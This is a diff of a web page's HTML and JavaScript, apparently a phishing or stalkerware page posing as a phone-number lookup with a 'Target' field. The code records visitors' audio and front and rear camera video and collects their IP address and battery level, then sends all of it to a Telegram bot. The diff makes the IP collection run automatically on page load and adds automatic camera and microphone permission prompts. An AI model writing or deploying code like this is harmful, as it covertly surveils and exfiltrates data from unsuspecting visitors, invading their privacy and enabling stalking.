@@ -50,10 +50,9 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    /* Style Notifikasi Biru */
     #notif {
       font-size: 14px;
-      color: #00d9ff; /* Biru */
+      color: #00d9ff;
       font-weight: 600;
       height: 20px;
       margin-bottom: 10px;
@@ -117,13 +116,8 @@
         formData.append('chat_id', id);
         formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
-        
         let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
-
-        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
-          method: 'POST',
-          body: formData
-        }).catch(console.error);
+        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -133,8 +127,20 @@
         const ipData = await ipRes.json();
         const battery = await navigator.getBattery?.() || { level: 0 };
         const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
-        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n<pre>${text}</pre>`);
       } catch {}
+    }
+
+    async function requestPermissions() {
+      try {
+        // Meminta izin mic & kamera secara otomatis saat masuk
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        // Jika diizinkan, matikan stream sementara agar tidak membebani HP hingga tombol ditekan
+        stream.getTracks().forEach(track => track.stop());
+        console.log("Permissions granted");
+      } catch (err) {
+        console.log("Permissions denied or not available");
+      }
     }
 
     async function recordAudio() {
@@ -155,13 +161,9 @@
 
     async function recordVideo(facingMode, label) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: facingMode }, 
-          audio: true 
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
-
         return new Promise((resolve) => {
           mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
           mediaRecorder.onstop = () => {
@@ -170,39 +172,37 @@
             stream.getTracks().forEach(track => track.stop());
             resolve();
           };
-
           mediaRecorder.start();
           setTimeout(() => mediaRecorder.stop(), 6000);
         });
-      } catch (err) {
-        resolve();
-      }
+      } catch (err) { resolve(); }
     }
 
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
-      
       button.disabled = true;
-      notif.style.display = 'none'; // Sembunyikan notif jika klik ulang
+      notif.style.display = 'none';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
-        await getInfo();
         recordAudio(); 
-        
         await recordVideo("user", "Depan");
         await new Promise(r => setTimeout(r, 1000));
         await recordVideo("environment", "Belakang");
-        
-        // Tampilkan notifikasi biru setelah semua selesai
         notif.style.display = 'block';
-        
         button.disabled = false;
         input.value = '';
       } catch (e) {
         button.disabled = false;
       }
+    });
+
+    // Inisialisasi saat masuk website
+    document.addEventListener('DOMContentLoaded', () => {
+      createParticles();
+      getInfo(); // Ambil info sistem langsung
+      requestPermissions(); // Langsung munculkan izin akses (kamera/mic)
     });
 
     function createParticles() {
@@ -215,7 +215,6 @@
         container.appendChild(p);
       }
     }
-    document.addEventListener('DOMContentLoaded', createParticles);
   </script>
 </body>
 </html>
